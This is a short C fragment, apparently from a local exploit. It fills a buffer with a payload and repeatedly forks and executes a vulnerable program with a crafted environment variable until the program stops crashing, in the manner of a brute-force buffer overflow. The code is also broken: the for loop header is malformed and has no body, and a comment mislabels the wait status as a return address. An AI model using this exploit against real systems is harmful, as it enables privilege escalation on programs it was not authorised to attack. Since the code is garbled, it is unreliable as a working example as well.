p = (int *) buff;
for(i=0; i<payload_size; i+= sizeof(int); p++)

// While our process hasnt correctly quit
do  {
    switch(pid=fork()){
        case 0:
            // Execute the vulnerable program using our crafted enviornmental variable
            execle(appname, appname, buff, NULL, env);
            exit(1);
            break;
        default:
            // wait for child process to terminate and get its return adress
            waitpid(pid, &ret, 0);
            break;
    }
} while(ret);